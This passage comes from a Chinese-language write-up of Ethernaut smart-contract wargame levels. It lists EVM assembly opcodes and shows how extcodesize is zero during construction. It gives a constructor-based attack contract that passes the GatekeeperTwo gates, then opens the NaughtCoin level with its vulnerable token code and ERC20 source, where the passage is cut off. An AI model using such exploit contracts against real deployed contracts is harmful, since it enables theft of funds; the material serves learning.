align=\"center\"></td>\n<td align=\"right\">如果x &gt; y,返回1，否则返回0,对于有符号数，用补码</td>\n</tr>\n<tr>\n<td>eq(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">如果x &#x3D;&#x3D; y,返回1，否则返回0</td>\n</tr>\n<tr>\n<td>iszero(x)</td>\n<td align=\"center\"></td>\n<td align=\"right\">如果x &#x3D;&#x3D; 0,返回1，否则返回0</td>\n</tr>\n<tr>\n<td>and(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x和y按位与</td>\n</tr>\n<tr>\n<td>or(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x和y按位或</td>\n</tr>\n<tr>\n<td>xor(x,y)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x和y按位异或</td>\n</tr>\n<tr>\n<td>byte(n,x)</td>\n<td align=\"center\"></td>\n<td align=\"right\">x的第n位，最重要的是第0位</td>\n</tr>\n<tr>\n<td>addmod(x,y,m)</td>\n<td align=\"center\"></td>\n<td align=\"right\">(x + y) % m，可以是任意精度的算术</td>\n</tr>\n<tr>\n<td>mulmod(x,y,m)</td>\n<td align=\"center\"></td>\n<td align=\"right\">(x * y) % m，可以是任意精度的算术</td>\n</tr>\n<tr>\n<td>signxtend(i,x)</td>\n<td align=\"center\"></td>\n<td align=\"right\">从第（i * 8 +  7）位开始数最少签名位数，来扩展签名</td>\n</tr>\n<tr>\n<td>keccak256(p,n)</td>\n<td align=\"center\"></td>\n<td align=\"right\">keccak(mem[p…(p+n)))</td>\n</tr>\n<tr>\n<td>sha3(p,n)</td>\n<td align=\"center\"></td>\n<td align=\"right\">sha3(mem[p…(p+n)))</td>\n</tr>\n<tr>\n<td>jump(label)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">跳转到label标签／代码位置</td>\n</tr>\n<tr>\n<td>jumpi(label, cond)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">如果cond非零，就跳转到label标签</td>\n</tr>\n<tr>\n<td>pc</td>\n<td align=\"center\"></td>\n<td align=\"right\">代码的当前位置</td>\n</tr>\n<tr>\n<td>pop(x)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">删除x推入的元素</td>\n</tr>\n<tr>\n<td>dup1 … dup16</td>\n<td align=\"center\"></td>\n<td align=\"right\">拷贝第i位的元素到栈顶（从顶端开始数）</td>\n</tr>\n<tr>\n<td>swap1 … swap16</td>\n<td align=\"center\">*</td>\n<td align=\"right\">交换栈顶和第i位的元素</td>\n</tr>\n<tr>\n<td>mload（p）</td>\n<td align=\"center\"></td>\n<td align=\"right\">mem[p..(p+32))</td>\n</tr>\n<tr>\n<td>mstore(p, v)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">mem[p..(p+32)) :&#x3D; v</td>\n</tr>\n<tr>\n<td>mstore8(p, v)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">mem[p] :&#x3D; v &amp; 0xff - 只分配一个字节</td>\n</tr>\n<tr>\n<td>sload(p)</td>\n<td align=\"center\"></td>\n<td align=\"right\">storage[p]</td>\n</tr>\n<tr>\n<td>sstore(p, v)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">storage[p] :&#x3D; v</td>\n</tr>\n<tr>\n<td>msize</td>\n<td align=\"center\"></td>\n<td align=\"right\">内存的大小，例如最大的内存可访问索引</td>\n</tr>\n<tr>\n<td>gas</td>\n<td align=\"center\"></td>\n<td align=\"right\">可用的gas数</td>\n</tr>\n<tr>\n<td>address</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前合约／执行上下文的地址</td>\n</tr>\n<tr>\n<td>balance(a)</td>\n<td align=\"center\"></td>\n<td align=\"right\">地址a的余额，单位为wei</td>\n</tr>\n<tr>\n<td>caller</td>\n<td align=\"center\"></td>\n<td align=\"right\">调用者（不包含delegatecall）</td>\n</tr>\n<tr>\n<td>callvalue</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前调用发送的wei数</td>\n</tr>\n<tr>\n<td>calldataload(p)</td>\n<td align=\"center\"></td>\n<td align=\"right\">从位置p开始的调用数据（32位）</td>\n</tr>\n<tr>\n<td>calldatasize</td>\n<td align=\"center\"></td>\n<td align=\"right\">调用数据的大小，bytes为单位</td>\n</tr>\n<tr>\n<td>calldatacopy(t,f,s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">从数据位置f，拷贝s位数据，到内存位置t</td>\n</tr>\n<tr>\n<td>codesize</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前合约&#x2F;执行上下文的代码大小</td>\n</tr>\n<tr>\n<td>codecopy(t,f,s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">从代码位置f，拷贝s位数据，到内存位置t</td>\n</tr>\n<tr>\n<td>extcodesize(a)</td>\n<td align=\"center\"></td>\n<td align=\"right\">地址a处代码的大小</td>\n</tr>\n<tr>\n<td>extcodecopy(a, t, f, s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">像codecopy(t,f,s)，但是是位置a处的代码</td>\n</tr>\n<tr>\n<td>returndatasize</td>\n<td align=\"center\"></td>\n<td align=\"right\">上个返回值的数据大小</td>\n</tr>\n<tr>\n<td>returndatacopy(t, f, s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">在返回数据的位置f拷贝s位，到内存位置t</td>\n</tr>\n<tr>\n<td>create(v, p, s)</td>\n<td align=\"center\"></td>\n<td align=\"right\">用 mem[p..(p+s))长度的代码，创建一个新的合约，发送v wei的以太币，并返回合约地址</td>\n</tr>\n<tr>\n<td>create2(v, n, p, s)</td>\n<td align=\"center\"></td>\n<td align=\"right\">用 地址为keccak256(&lt; address &gt; . n . keccak256(mem[p..(p+s)))，mem[p..(p+s))长度的代码，创建一个新的合约，发送v wei的以太币，并返回合约地址</td>\n</tr>\n<tr>\n<td>call(g, a, v, in, insize, out, outsize)</td>\n<td align=\"center\"></td>\n<td align=\"right\">调用地址a上的合约，参数为mem[in..(in+insize))，提供g的gas，v wei的以太币，输出到mem[out..(out+outsize))，如果成功返回1，失败（例如gas不足）返回0</td>\n</tr>\n<tr>\n<td>callcode(g, a, v, in, insize, out, outsize)</td>\n<td align=\"center\"></td>\n<td align=\"right\">与<em>call</em>相同，但是使用a处的代码，并只能在当前合约的上下文中执行</td>\n</tr>\n<tr>\n<td>delegatecall(g, a, in, insize, out, outsize)</td>\n<td align=\"center\"></td>\n<td align=\"right\">与<em>callcode</em>相同，但是保留<code>caller</code>和<code>callvalue</code></td>\n</tr>\n<tr>\n<td>staticcall(g, a, in, insize, out, outsize)</td>\n<td align=\"center\"></td>\n<td align=\"right\">与_call(g, a, 0, in, insize, out, outsize) _相同，但是不允许改变状态</td>\n</tr>\n<tr>\n<td>return(p, s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">结束执行，返回数据mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>revert(p, s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">结束执行，恢复状态变化，返回数据mem[p..(p+s))</td>\n</tr>\n<tr>\n<td>selfdestruct(a)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">结束执行，销毁当前合约，并把余额发送给a地址</td>\n</tr>\n<tr>\n<td>invalid</td>\n<td align=\"center\">-</td>\n<td align=\"right\">用invalid指令结束执行</td>\n</tr>\n<tr>\n<td>log0(p,s)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">记录日志，不包含主题，数据为mem[p..(p+s)</td>\n</tr>\n<tr>\n<td>log1(p,s,t1)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">记录日志，包含主题t1，数据为mem[p..(p+s)</td>\n</tr>\n<tr>\n<td>log2(p,s,t1,t2)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">记录日志，包含主题t1，t2，数据为mem[p..(p+s)</td>\n</tr>\n<tr>\n<td>log3(p,s,t1,t2,t3)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">记录日志，包含主题t1，t2，t3，数据为mem[p..(p+s)</td>\n</tr>\n<tr>\n<td>log4(p,s,t1,t2,t3,t4)</td>\n<td align=\"center\">-</td>\n<td align=\"right\">记录日志，包含主题t1，t2，t3，t4，数据为mem[p..(p+s)</td>\n</tr>\n<tr>\n<td>origin</td>\n<td align=\"center\"></td>\n<td align=\"right\">交易发起方</td>\n</tr>\n<tr>\n<td>gasprice</td>\n<td align=\"center\"></td>\n<td align=\"right\">交易的gas价格</td>\n</tr>\n<tr>\n<td>blockhash(b)</td>\n<td align=\"center\"></td>\n<td align=\"right\">区块序列为b的hash - 只能获取到当前块的最近256块</td>\n</tr>\n<tr>\n<td>coinbase</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前的矿工收益</td>\n</tr>\n<tr>\n<td>timestamp</td>\n<td align=\"center\"></td>\n<td align=\"right\">自创世纪区块以来的时间戳，单位为秒</td>\n</tr>\n<tr>\n<td>number</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前区块的序号</td>\n</tr>\n<tr>\n<td>difficulty</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前区块的难度</td>\n</tr>\n<tr>\n<td>gaslimit</td>\n<td align=\"center\"></td>\n<td align=\"right\">当前代码块的gas限制</td>\n</tr>\n</tbody></table>\n<p>学习到extcodesize(caller())是一种检验合约地址还是账户地址的操作，如果caller为账户则extcodesize(caller())为0，如果caller为合约则extcodesize(caller())为对应的字节码，如下为测试合约</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span> \n       x <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><span class=\"token punctuation\">)</span>\n   <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token keyword\">return</span> x<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> y<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            y<span class=\"token operator\">:=</span><span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4a9C121080f6D9250Fc0143f41B595fD172E31bf</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> y<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>测试结果为如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245684.png\"></p>\n<p>&#x3D;&#x3D;<strong>进一步了解得知：合约在初始化，代码大小为0。即需要将攻击过程写在constuctor中</strong>&#x3D;&#x3D;</p>\n<h2 id=\"Attack-12\"><a href=\"#Attack-12\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    GatekeeperTwo <span class=\"token keyword\">public</span> target<span class=\"token operator\">=</span><span class=\"token function\">GatekeeperTwo</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfD6a4183eed0115CBe743c480eA4042C15F0a86c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes8</span> <span class=\"token keyword\">public</span> result<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        result <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffffffffffff</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">enter</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"15-Naught-Coin\"><a href=\"#15-Naught-Coin\" class=\"headerlink\" title=\"15.Naught Coin\"></a>15.Naught Coin</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>\n<p> Things that might help</p>\n<ul>\n<li>The <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\">ERC20</a> Spec</li>\n<li>The <a href=\"https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts\">OpenZeppelin</a> codebase</li>\n</ul></blockquote>\n<h2 id=\"Code-14\"><a href=\"#Code-14\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/token/ERC20/ERC20.sol'</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">contract</span> <span class=\"token class-name\">NaughtCoin</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token comment\">// string public constant name = 'NaughtCoin';</span>\n  <span class=\"token comment\">// string public constant symbol = '0x0';</span>\n  <span class=\"token comment\">// uint public constant decimals = 18;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> timeLock <span class=\"token operator\">=</span> now <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span> days<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> INITIAL_SUPPLY<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> player<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _player<span class=\"token punctuation\">)</span> \n  <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NaughtCoin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0x0'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    player <span class=\"token operator\">=</span> _player<span class=\"token punctuation\">;</span>\n    INITIAL_SUPPLY <span class=\"token operator\">=</span> <span class=\"token number\">1000000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">decimals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// _totalSupply = INITIAL_SUPPLY;</span>\n    <span class=\"token comment\">// _balances[player] = INITIAL_SUPPLY;</span>\n    <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span> INITIAL_SUPPLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> player<span class=\"token punctuation\">,</span> INITIAL_SUPPLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _value<span class=\"token punctuation\">)</span> override <span class=\"token keyword\">public</span> lockTokens <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    super<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// Prevent the initial owner from transferring tokens until the timelock has passed</span>\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">lockTokens</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">></span> timeLock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>erc20.sol</strong></p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./extensions/IERC20Metadata.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../../utils/Context.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ERC20</span> <span class=\"token keyword\">is</span> Context<span class=\"token punctuation\">,</span> IERC20<span class=\"token punctuation\">,</span> IERC20Metadata <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _balances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _allowances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> _totalSupply<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">private</span> _name<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">private</span> _symbol<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name_<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        _name <span class=\"token operator\">=</span> name_<span class=\"token punctuation\">;</span>\n        _symbol <span class=\"token operator\">=</span> symbol_<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _symbol<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">decimals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _totalSupply<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _allowances<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token 